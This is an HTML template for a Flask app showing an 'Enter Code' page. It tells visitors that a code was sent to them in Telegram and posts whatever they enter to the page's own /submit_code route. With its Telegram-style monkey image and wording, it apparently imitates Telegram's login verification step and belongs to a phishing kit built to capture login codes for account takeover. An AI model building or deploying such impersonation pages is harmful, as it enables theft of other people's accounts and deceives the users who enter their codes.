<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter Code</title>
  <style>
    body {
      margin: 0;
      background-color: #1c1c1c;
      font-family: Arial, sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .emoji {
      width: 25vw;
      max-width: 140px;
      min-width: 72px;
      height: auto;
      margin-bottom: 30px;
    }

    .info-text {
      color: #b0b7c3;
      font-size: 15px;
      margin-bottom: 30px;
      text-align: center;
      max-width: 300px;
    }

    .code-input {
      width: 100%;
      max-width: 320px;
      padding: 14px;
      border: 2px solid #444;
      border-radius: 12px;
      background-color: transparent;
      color: #fff;
      font-size: 18px;
      outline: none;
      box-sizing: border-box;
    }

    .code-input:focus {
      border-color: #9b83e8;
    }

    button {
      margin-top: 20px;
      padding: 14px;
      width: 100%;
      max-width: 320px;
      border: none;
      border-radius: 12px;
      background-color: #9b83e8;
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    button:hover:not(.loading) {
      background-color: #8b73d8;
    }

    button.loading {
      background-color: #666;
      cursor: not-allowed;
    }

    .spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 3px solid #fff;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-right: 10px;
    }

    button.loading .spinner {
      display: inline-block;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .error-message {
      color: #ff4444;
      font-size: 16px;
      font-weight: bold;
      margin-bottom: 20px;
      text-align: center;
      background-color: rgba(255, 68, 68, 0.1);
      padding: 10px;
      border-radius: 8px;
      max-width: 320px;
    }
  </style>
</head>
<body>

  <img src="{{ url_for('static', filename='makaka.png') }}" alt="Monkey" class="emoji" />

  <div class="info-text">
    We have sent you a message in Telegram<br>with the code.
  </div>

  {% if error %}
    <div class="error-message">{{ error }}</div>
  {% endif %}

  <form id="code-form" action="/submit_code" method="POST">
    <input type="text" name="code" class="code-input" placeholder="Code" maxlength="10" value="{{ previous_code | default('') }}" />
    <button type="submit" id="submit-button">
      <span class="spinner"></span>
      <span class="button-text">Next</span>
    </button>
  </form>

  <script>
    const form = document.getElementById('code-form');
    const button = document.getElementById('submit-button');
    const buttonText = button.querySelector('.button-text');

    form.addEventListener('submit', (e) => {
      // Показываем состояние загрузки
      button.classList.add('loading');
      buttonText.textContent = 'Loading...';
      button.disabled = true;
    });
  </script>

</body>
</html>
